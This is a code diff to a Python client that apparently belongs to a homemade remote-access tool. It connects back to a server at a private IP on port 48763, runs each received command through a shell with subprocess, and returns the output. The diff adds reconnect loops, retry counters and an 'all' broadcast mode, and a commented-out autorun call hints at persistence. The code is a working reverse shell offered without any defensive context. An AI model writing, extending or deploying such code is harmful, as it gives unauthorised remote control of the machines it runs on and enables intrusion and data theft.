@@ -3,6 +3,7 @@ import socket
 import subprocess
 import ctypes
 import os
+import time
 
 
 def ConnectToServer(hostIP, port):
@@ -78,9 +79,11 @@ def Main():
     # setAutoRunScript()
 
     # Set server IP and port
-    hostIP = '127.0.0.1'
+    hostIP = '192.168.50.131'
     port = 48763
+    counter = 0
     userClose = False
+    allCommand = False
 
     while True:
         if userClose:
@@ -89,20 +92,28 @@ def Main():
             # Connect to server
             clientSocket = ConnectToServer(hostIP=hostIP, port=port)
 
-            clientIndexString = str(clientSocket.recv(1024), encoding='big5' or 'utf-8')
+            clientIndexString = str(clientSocket.recv(1024), encoding='utf-8')
             clientInformation = "Status: Client " + clientIndexString + " is connected."
             clientSocket.sendall(clientInformation.encode())
 
             while True:
                 try:
-                    command = str(clientSocket.recv(1024), encoding='big5' or 'utf-8')
+                    command = str(clientSocket.recv(1024), encoding='utf-8')
+
+                    counter = 0
 
                     if command != None:
+                        if command == 'all':
+                            command = str(clientSocket.recv(1024), encoding='utf-8')
+                            allCommand = True
+                        else:
+                            allCommand = False
+
                         if command == 'stop':
                             message = 'client stop'
 
                             try:
-                                clientSocket.sendall(message.encode())
+                                clientSocket.sendall(message.encode('utf-8'))
                             except:
                                 print("Connection Error: Sending stop message fail.")
 
@@ -112,24 +123,47 @@ def Main():
                             userClose = True
 
                             try:
-                                clientSocket.sendall(message.encode())
+                                clientSocket.sendall(message.encode('utf-8'))
                             except:
                                 print("Connection Error: Sending stop message fail.")
 
                             break
 
                         terminal = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
-                        stdout, stderr = terminal.communicate(timeout=5)  
+                        stdout, stderr = terminal.communicate(timeout=5)
 
-                        try:
-                            clientSocket.sendall(stdout)
-                        except:
-                            print("Connection Error: Sending terminal output fail.")
+                        # stdoutEncoding = chardet.detect(stdout)
+
+                        # print(stdoutEncoding)
+
+                        if allCommand == False:
+                            try:
+                                clientSocket.sendall(stdout.decode('big5').encode('utf-8'))
+
+                                counter = 0
+                            except:
+                                if counter < 3:
+                                    print("Connection Error: Sending terminal output fail.")
+
+                                    time.sleep(3)
+
+                                    counter += 1
+                                else:
+                                    break
+                        # else:
+                        #     print(stdout)
                 except:
-                    print("Connection Error: Receiving command fail.")
+                    if counter < 3:
+                        print("Connection Error: Receiving command fail.")
+
+                        time.sleep(3)
+
+                        counter += 1
+                    else:
+                        break
 
         clientSocket.close()
-
+        time.sleep(15)
         
 
 if __name__ == '__main__':
